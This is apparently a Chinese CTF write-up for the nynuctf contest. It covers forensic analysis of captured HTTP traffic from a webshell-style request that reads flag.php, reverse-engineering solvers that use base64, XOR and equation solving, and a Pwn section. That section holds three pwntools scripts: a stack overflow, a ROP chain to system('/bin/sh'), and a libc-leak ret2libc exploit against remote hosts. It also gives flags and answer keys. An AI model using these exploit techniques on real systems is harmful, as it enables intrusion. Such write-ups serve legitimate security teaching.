> 带黑阔小明这回准备充分，已经把马老师电脑上的流量记录工具关闭了，但是大意了没想到马老师竟然还准备了另一个流量记录工具，可是小明这回学聪明了，马老师也没找到充足的证据证明小明偷了flag，马老师说你如果帮他找到小明偷flag的确切证据，他就把flag给你，你能帮帮马老师吗？

下载附件得到一个`.pcapng`文件，这就是`Wireshark`抓的流量包，还算挺常见的，直接打开就完事了。

![file](https://i.loli.net/2021/11/04/7lvx2tJRSkYyfZB.png)

打开大致浏览一下发现http包的出现频率还挺高的，所以应该也是一道http流量分析，那就过滤一下其他流量，看看还剩下啥。

![file](https://i.loli.net/2021/11/04/gjldEJWkh2SAyuv.png)

发现主要都是`192.168.3.2`和`192.168.3.160`的内网流量，那肯定是题目相关的没跑了。

还是从下往上看，但是发现返回数据被编码过了，不过返回数据里很好心地提供了发送的传参，所以加密过程应该就在前半句话，那就尝试解码嘛。

![file](https://i.loli.net/2021/11/04/GeHQSmEKUJwFZyn.png)

![file](https://i.loli.net/2021/11/04/rSuflAiFLsQPOJ6.png)

大致意思就是把`flag.php`的内容读取出来，然后flate压缩一下，再base64编码一下避免乱码，就得到了后半句话。

那就倒着把后半句话解码一下呗，直接就得到flag了。

![file](https://i.loli.net/2021/11/04/EHCv5VOxwPoqRJm.png)

> `nynuctf{4ea0e47f-ac9f-45c3-8830-c25afd74d3cb}`



## Re

### sign

签到题，用idea反编译后可以根据主函数的代码逻辑，也可以直接查找字符串

双击左侧函数列表中的main函数跳转到主函数段：

![image-20211031140604712.png](https://i.loli.net/2021/10/31/fV1jENlobLr7ick.png)

然后按F5反编译主函数，来看一下反编译后的代码：

![image-20211031140057092.png](https://i.loli.net/2021/10/31/LhlEByDRors78Cv.png)

输入的flag存放到Str中，然后带入函数sub_40100F后将返回值赋值给Str2，最后再比较Str1和Str2

双击Str1后可以跳转到Str1指向的地址位置，得到存放的字符串：

![image.png](https://i.loli.net/2021/10/31/7jpyuJhD4SRxB3X.png)

很明显是base64编码，解密后得到flag。那么函数sub_40100A的作用就是将传入的字符串进行base64编码。

也可以查看函数的具体代码得知是base64加密：

![image-20211031140347166.png](https://i.loli.net/2021/10/31/g4FluptGVRiMOJ6.png)

当然，最简单的就是用快捷键shift+F12查找字符串，然后就能直接找到密文：

![image.png](https://i.loli.net/2021/10/31/wKFJHosvWGmt7qk.png)

然后用base64解密就能拿到flag

### 送分题

还是放入ida，打开main函数发现都是乘除运算；

![wpsBCD8.tmp.jpg](https://i.loli.net/2021/11/02/jiq7FP3LcwBnC16.jpg) 

 

那么算出来就可以了，注意s1【9】是1，还有ida里13,14反了。

Python版：

```python
print(chr(179196160 //   1629056)) 
print(chr(819363600 //   6771600)) 
print(chr(405123840 //   3682944)) 
print(chr(1220427000 //   10431000))
print(chr(393755472 //   3977328)) 
print(chr(596046976 //   5138336)) 
print(chr(768289500 //   7532250)) 
print(chr(489211344 //   3977328)) 
print(chr(518971936 //   5138336 ))  
print(1)
print(chr( 406741500//   7532250)) 
print(chr( 294236496//   5551632)) 
print(chr( 177305856//   3409728)) 
print(chr( 650683500 // 13013670))
print(chr( 298351053// 6088797)) 
print(chr( 386348487//   7884663)) 
print(chr( 438258597//   8944053)) 
print(chr( 719890500//   5759124))
```



C++版：

```c++
#include <iostream>
#include <stdio.h>
using namespace std;

int main () {

  cout<<char (179196160/1629056) ;
  cout<<char (819363600 /  6771600);
  cout<<char(405123840 /   3682944);
  cout<<char(1220427000 /  10431000);
  cout<<char(393755472 /   3977328);
  cout<<char(596046976 /   5138336);
  cout<<char(768289500 /   7532250);
  cout<<char(489211344 /   3977328);

  cout<<char(518971936 /   5138336 );
  cout<<"1";
  cout<<char( 406741500/   7532250);
  cout<<char( 294236496/   5551632);
  cout<<char( 177305856/   3409728);
  cout<<char( 650683500 / 13013670);
  cout<<char( 298351053/ 6088797);

  cout<<char( 386348487/   7884663);
  cout<<char( 438258597/   8944053);
  cout<<char( 719890500/   5759124);

  system("PAUSE");
  return 0;
}
```



### 加法减法

还是先查看主函数的代码，可以通过左侧的函数窗口进入，也可以通过搜索字符串进入：

![image-20211031141135095.png](https://i.loli.net/2021/10/31/Y9CvIQBgjsbx3XK.png)

首先从第一个if语句可以得知输入的flag应该是25位的，然后就进入了一个while循环。循环体是两个if函数。先来看if成立的条件：

![image-20211031141410046.png](https://i.loli.net/2021/10/31/7t6aC5eb9ATsmf2.png)

这里我们要知道A的ASCII码是65，Z的ASCII码是90；a的ASCII码是97，z的ASCII码是122。然后就会明白，当Str[v3]中存放的字符是大写时，满足第一个If，Str[3]要加上dword_407000[v2]；当Str[v3]存放的字符是小写时，满足第二个If，Str[3]要减去dword_407000[v2]。

这里我们双击dword_407000可以跳转到他的地址位置，然后就能得知这里面存放的是一个整型数组，v2代表了数组的第几个元素。

while之后就是一个比较函数，判断Str和Str2是否相同，相同就正确。双击Str2可以得知这里面存放了一个字符串：

![image-20211031145342774.png](https://i.loli.net/2021/10/31/mBjcLzZ3T1fV2Ue.png)

然后就是写脚本逆向：

```python
Str2 = list("kulqbsa{^bb_Ehb_VZa_Qlbm}")
dword_407000 = [3,4,2,4,1,1,5,3,2,2,4,6,2,3,5,1,2,4,3,5]
n=0
for i in range(0,len(Str2)):
    if Str2[i] == '_' or Str2[i] == '{' or Str2[i] == '}':
        continue
    if ord(Str2[i]) - dword_407000[n] >= 65 and ord(Str2[i]) - dword_407000[n] <= 90: # 大写字母
        Str2[i] = chr(ord(Str2[i]) - dword_407000[n])
        print(Str2[i]+" "+str(n))
    elif ord(Str2[i]) + dword_407000[n] >= 97 and ord(Str2[i]) + dword_407000[n] <= 122: # 小写字母
        Str2[i] = chr(ord(Str2[i]) + dword_407000[n])
        print(Str2[i]+" "+str(n))
    n = n+1
print("".join(Str2))
```

运行得到flag



### ？？？

1. 把下载好的文件放入ida（64位）中，在左侧找到main函数，点击然后摁f5就可以看反汇编代码了。

![图片 7.png](https://i.loli.net/2021/11/02/zKX1tyRaShTJMvi.png) 

2.这个程序呢是，获得输入的flag给s1，然后a1字符串进行异或加密，异或后的答案如果和flag相等就返回恭喜你，如果不相等就返回再试一次![wps23AA.tmp.jpg](https://i.loli.net/2021/11/02/cdWvGYTiZgHj3l6.jpg)

3.关键的加密算法是异或，是和变量i_0异或，变量i_0是1-9

​            

4.那什么是异或呢 

百度百科：https://baike.baidu.com/item/%E5%BC%82%E6%88%96/10993677  

![图片 2.png](https://i.loli.net/2021/11/02/zkor9dnXUFiKqIc.png) 

我们输入的flag与”ymqmvqoi}”异或(1-9) 比较  ，写程序实现”ymqmvqoi}”异或(1-9)，那不就得到flag了么。



用python写如下：  

```python
a="ymqmvqoi}"
b=list(a)
for i in range(0,len(b)):
   b[i]=chr(ord(b[i])^i+1)
print(b)
```

  

用c++写如下：

```c++
#include <iostream>
#include <string.h>
int main() {
char a[10]="ymqmvqoi}";
for (int i=0;i<strlen(a);i++)
{
  a[i]=a[i]^(i+1);
}
printf("%s",a);
  return 0;
}
```



之后就出来了xoriswhat。

然后加上nynuctf{}提交即可                            



### 解方程

先用idea查看主函数的伪代码：

![image-20211031145831323.png](https://i.loli.net/2021/10/31/8GkRIheUmWzMAFC.png)

第一个if是判断输入长度，第二个if是判断输入字符串的格式。strncmp函数的作用是比较两个字符串前n位是否相同。根据这两个if条件我们可以知道flag的格式是：nynuctf{xxxx-xxxx-xxxx-xxxx}

v1,v2,v3,v4都调用了函数sub_40100A，双击查看函数作用：

![image-20211031154044625.png](https://i.loli.net/2021/10/31/Exvbuop7GfNK3hA.png)

函数sub_401270查看后可以知道是给v5分配一个新地址(可以搜一下c++new的用法)：

![image-20211031154213148.png](https://i.loli.net/2021/10/31/pN3A5nScKohIPOx.png)

然后a1是指向Str的指针，v6等于Str字符数组中的第a2位，下面那个循环是将Str字符数组中从第a2为开始往后的a3个字符都放入v5中，然后返回v5。因此我们可以知道函数sub_40100A的作用是截取字符串中的某一段。

v11,v12,v13,v14都调用了函数sub_40100F，双击查看函数作用：

![image.png](https://i.loli.net/2021/10/31/V6aCfMvFDdpUm9J.png)

a1中存放的是函数sub_40100A返回的Str中的某段字符串，从传入的参数来看是nynuctf{xxxx-xxxx-xxxx-xxxx}中xxxx的部分。

for循环中先用if语句判断是否是小写字母，是的话用字符对应的ASCII码减去87，不是的话用字符对应的ASCII码减去48。

假设字符为a—z，对应ASCII码97减去87后得10-35，其中a-e是在16进制中对应的数值。假设字符为0-9的话，对应ASCII码97减去48后得0-9。然后再乘上16的（4-对应位数-1）次方，加到v5中。循环结束后返回v5。综合起来可以知道函数sub_40100A的作用就是将16进制的字符串转化为10进制的整数。

分析完两个函数之后我们再来看主函数。v11-v14中存放的是flag：nynuctf{xxxx-xxxx-xxxx-xxxx}中xxxx部分转化为10进制后的数，而下面v7-v10先看下面的if可以知道要让它们等于0，flag才能正确：



![image-20211031160222404.png](https://i.loli.net/2021/10/31/DsbIGkSB5Nm3MEr.png)

所以我们可以知道，v11和v12为方程：x^2-67578x+1138823496=0 的两个解，v13和v14为方程 x^2-34692x+295973060=0 的两个解。

都分析完后我们可以开始写解题脚本：

```python
def qiugen(a,b,c): # 传入方程的参数a,b,c，用公式法计算出方程的根
	x = [0,0]
	x[0] = ((b * -1) + ((b**2 - 4*a*c)**0.5)) / (2*a)
	x[1] = ((b * -1) - ((b**2 - 4*a*c)**0.5)) / (2*a)
	return x

list1 = qiugen(1,-67578,1138823496) + qiugen(1,-34692,295973060)
list1 = list(map(int,list1)) # 将浮点类型转换为整数类型
str1 = "nynuctf{"
for i in list1:
    str1 += str(hex(i))[2:] # 将十进制数转换为十六进制数，并转换为字符串类型，截取0x后的字符串
    if i != list1[3]:
        str1 += "-"
str1 += "}"
print(str1)
```

运行得到flag



## Pwn

### Stack

```python
from pwn import *
p = remote("111.231.70.44",28010)
p.recv()
payload = b"A"*(0x9+4) + p32(0x0804850F)
p.send(payload)
p.interactive()
```

### pwn1-rop

```python
#!usr/bin/python
from pwn import *
context.log_level = 'debug'

binary = "./pwn1-rop"
ip = ""
port = 123
elf = ELF(binary)
sys_addr = elf.symbols['system']
binsh_addr = 0x0000000000601048
pop_rdi = 0x0000000000400683

io = remote(ip, port)
io.recv()
io.sendline("a" * 0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr))
io.interactive()
```



### pwn2-libc-rop

```python
#coding=utf-8

from pwn import *

r=remote("39.105.160.88",666)
elf=ELF('pwn2-libc-rop')
libc=ELF('./libc.23.so')

rdi_ret=0x400733
rsi_r15_ret=0x400731
format_str=0x400770  #%s
read_got=elf.got['read']
printf_plt=elf.plt['printf']
main_addr=0x400636

payload='a'*0x20+'b'*0x8
payload+=p64(rdi_ret)+p64(format_str)
payload+=p64(rsi_r15_ret)+p64(read_got)+p64(0x0)
payload+=p64(printf_plt)+p64(main_addr)

r.recvuntil("What's your name?")
r.sendline(payload)

read_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base=read_addr-libc.symbols['read']
system_addr=libc_base+libc.symbols['system']
binsh_addr=libc_base+libc.search('/bin/sh').next()

payload2='a'*0x20+'b'*0x8+p64(rdi_ret)+p64(binsh_addr)+p64(system_addr)+p64(main_addr)
r.recvuntil("What's your name?")
r.sendline(payload2)

r.interactive()
p.interactive()
```